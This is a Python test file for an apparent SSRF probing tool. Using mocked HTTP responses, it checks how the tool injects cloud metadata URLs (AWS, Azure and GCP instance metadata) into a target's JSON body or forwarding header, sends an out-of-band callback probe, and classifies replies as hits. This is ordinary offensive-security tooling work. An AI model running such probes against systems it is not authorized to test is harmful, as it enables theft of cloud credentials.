from unittest.mock import patch

import requests

from tradecraft.adapters.ssrf_probe.execute import (
    METADATA_PRESETS,
    RawSsrfResult,
    SsrfAttempt,
    execute,
    normalize_target_url,
)
from tradecraft.adapters.ssrf_probe.parse import parse_ssrf_result

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0"}
TARGET = "https://shop.example.com/api/fetch-preview"
TEMPLATE = '{"callback_url": "__SSRF__", "name": "test"}'

# Realistic backend responses.
IMDS_V1_BODY = "ami-id\nami-launch-index\nhostname\nlocal-ipv4\nmac\nprofile\n"
# Azure IMDS without the Metadata: true header.
AZURE_400 = '{"error":{"code":"BadRequest","message":"Required metadata header not specified"}}'
PREVIEW_FAIL_500 = '{"error":"upstream fetch failed"}'


class Recorder:
    def __init__(self, responder):
        self.responder = responder
        self.calls = []

    def _do(self, method, url, **kwargs):
        self.calls.append({"method": method, "url": url, **kwargs})
        out = self.responder(method, url, kwargs)
        if isinstance(out, Exception):
            raise out
        status, text = out
        resp = requests.Response()
        resp.status_code = status
        resp._content = text.encode()
        resp.encoding = "utf-8"
        return resp

    def get(self, url, **kwargs):
        return self._do("GET", url, **kwargs)

    def post(self, url, **kwargs):
        return self._do("POST", url, **kwargs)


def _patched(recorder):
    return (
        patch("tradecraft.adapters.ssrf_probe.execute.requests.get", side_effect=recorder.get),
        patch("tradecraft.adapters.ssrf_probe.execute.requests.post", side_effect=recorder.post),
    )


def _run(recorder, **kwargs):
    p_get, p_post = _patched(recorder)
    with p_get, p_post:
        return execute(**kwargs)


# --- validation ---------------------------------------------------------------

def test_normalize_target_url():
    assert normalize_target_url("shop.example.com/x") == "https://shop.example.com/x"
    assert normalize_target_url(" ") == ""


def test_invalid_inject_location_is_error_without_requests():
    rec = Recorder(lambda *a: (200, ""))
    raw = _run(rec, target=TARGET, inject_location="query")
    assert raw.error == "inject_location must be 'json_body' or 'header'"
    assert rec.calls == []


def test_json_body_template_must_be_valid_json():
    rec = Recorder(lambda *a: (200, ""))
    raw = _run(rec, target=TARGET, inject_location="json_body", json_body_template="{callback_url: __SSRF__")
    assert raw.error == "json_body_template is not valid JSON"
    assert rec.calls == []


def test_json_body_template_must_contain_placeholder():
    rec = Recorder(lambda *a: (200, ""))
    raw = _run(rec, target=TARGET, inject_location="json_body", json_body_template='{"name": "test"}')
    assert raw.error == "json_body_template missing the __SSRF__ placeholder"
    assert rec.calls == []


def test_header_location_requires_header_name():
    rec = Recorder(lambda *a: (200, ""))
    raw = _run(rec, target=TARGET, inject_location="header")
    assert raw.error == "header_name is required when inject_location is 'header'"
    assert rec.calls == []


# --- exact requests ----------------------------------------------------------

def test_json_body_sends_post_with_placeholder_replaced_for_each_preset():
    rec = Recorder(lambda *a: (400, AZURE_400))
    raw = _run(rec, target=TARGET, inject_location="json_body", json_body_template=TEMPLATE, timeout=6)

    assert raw.error is None
    assert len(rec.calls) == len(METADATA_PRESETS)
    for call, (label, internal) in zip(rec.calls, METADATA_PRESETS.items()):
        assert call["method"] == "POST"
        assert call["url"] == TARGET
        assert call["data"] == '{"callback_url": "%s", "name": "test"}' % internal
        assert call["headers"] == {"Content-Type": "application/json", **UA}
        assert call["timeout"] == 6
        assert call["verify"] is False
    assert [a.preset_label for a in raw.attempts] == list(METADATA_PRESETS)


def test_json_body_explicit_get_method_sends_get_with_body():
    rec = Recorder(lambda *a: (200, "{}"))
    _run(rec, target=TARGET, inject_location="json_body", json_body_template=TEMPLATE, method="GET")
    assert rec.calls[0]["method"] == "GET"
    assert rec.calls[0]["data"] == '{"callback_url": "%s", "name": "test"}' % METADATA_PRESETS["aws_imds_v1"]


def test_header_location_sends_get_with_injected_header():
    rec = Recorder(lambda *a: (200, "ok"))
    _run(rec, target=TARGET, inject_location="header", header_name="X-Forwarded-Host", timeout=4)
    assert len(rec.calls) == len(METADATA_PRESETS)
    for call, internal in zip(rec.calls, METADATA_PRESETS.values()):
        assert call["method"] == "GET"
        assert call["url"] == TARGET
        assert call["headers"] == {"X-Forwarded-Host": internal, **UA}
        assert call["timeout"] == 4
        assert call["verify"] is False


def test_header_location_post_sends_empty_body():
    rec = Recorder(lambda *a: (200, "ok"))
    _run(rec, target=TARGET, inject_location="header", header_name="X-Forwarded-Host", method="POST")
    assert rec.calls[0]["method"] == "POST"
    assert rec.calls[0]["data"] == ""


def test_oob_domain_adds_one_blind_attempt():
    rec = Recorder(lambda *a: (200, "ok"))
    raw = _run(rec, target=TARGET, inject_location="header", header_name="X-Forwarded-Host",
               oob_domain="abc123.oast.me")
    assert raw.attempts[-1].preset_label == "oob_blind"
    assert raw.attempts[-1].internal_url == "http://abc123.oast.me/ssrf"
    assert rec.calls[-1]["headers"]["X-Forwarded-Host"] == "http://abc123.oast.me/ssrf"
    assert len(rec.calls) == len(METADATA_PRESETS) + 1


def test_per_attempt_exception_does_not_abort_the_rest():
    def responder(method, url, kwargs):
        if kwargs["data"] and "169.254.169.254/latest/api/token" in kwargs["data"]:
            return requests.Timeout("timed out")
        return (400, AZURE_400)

    rec = Recorder(responder)
    raw = _run(rec, target=TARGET, inject_location="json_body", json_body_template=TEMPLATE)
    assert len(rec.calls) == len(METADATA_PRESETS)
    errored = [a for a in raw.attempts if a.error]
    assert [a.preset_label for a in errored] == ["aws_imds_token"]
    assert "timed out" in errored[0].error


# --- parse.py against realistic responses -------------------------------------

def test_realistic_aws_imds_reply_is_a_hit_and_snippet_is_truncated():
    long_body = IMDS_V1_BODY + ("x" * 900)

    def responder(method, url, kwargs):
        if "169.254.169.254/latest/meta-data/" in kwargs["data"]:
            return (200, long_body)
        return requests.ConnectionError("no route to host")

    rec = Recorder(responder)
    raw = _run(rec, target=TARGET, inject_location="json_body", json_body_template=TEMPLATE)
    out = parse_ssrf_result(raw)

    assert out["target"] == TARGET
    assert out["inject_location"] == "json_body"
    assert len(out["hits"]) == 1
    hit = out["hits"][0]
    assert hit["preset_label"] == "aws_imds_v1"
    assert hit["internal_url"] == METADATA_PRESETS["aws_imds_v1"]
    assert hit["status"] == 200
    assert hit["body_snippet"] == long_body[:500]
    assert "oob_pending" not in out


def test_azure_400_from_metadata_service_counts_as_reached():
    def responder(method, url, kwargs):
        if "metadata/instance" in kwargs["data"]:
            return (400, AZURE_400)
        return requests.ConnectionError("refused")

    raw = _run(Recorder(responder), target=TARGET, inject_location="json_body", json_body_template=TEMPLATE)
    out = parse_ssrf_result(raw)
    assert [h["preset_label"] for h in out["hits"]] == ["azure_imds"]
    assert out["hits"][0]["status"] == 400


def test_500_and_404_and_connection_errors_are_not_hits():
    def responder(method, url, kwargs):
        if "api/token" in kwargs["data"]:
            return (500, PREVIEW_FAIL_500)
        if "computeMetadata" in kwargs["data"]:
            return (404, "not found")
        return requests.ConnectionError("refused")

    raw = _run(Recorder(responder), target=TARGET, inject_location="json_body", json_body_template=TEMPLATE)
    out = parse_ssrf_result(raw)
    assert out == {
        "target": TARGET,
        "inject_location": "json_body",
        "reason": "no injected internal URL produced a response across 4 attempt(s)",
    }


def test_oob_attempt_sets_oob_pending_when_there_is_a_hit():
    def responder(method, url, kwargs):
        if "169.254.169.254/latest/meta-data/" in kwargs["data"]:
            return (200, IMDS_V1_BODY)
        return (200, "ok")

    raw = _run(Recorder(responder), target=TARGET, inject_location="json_body",
               json_body_template=TEMPLATE, oob_domain="abc123.oast.me")
    out = parse_ssrf_result(raw)
    assert out["oob_pending"] is True
    assert "oob_blind" in [h["preset_label"] for h in out["hits"]]


def test_parse_error_passthrough():
    assert parse_ssrf_result(RawSsrfResult(target="t", inject_location="header", error="x")) == {
        "target": "t", "error": "x",
    }
    hit = RawSsrfResult(target="t", inject_location="header",
                        attempts=[SsrfAttempt("gcp_imds", "http://metadata.google.internal/", 403, "denied")])
    assert parse_ssrf_result(hit)["hits"][0]["status"] == 403
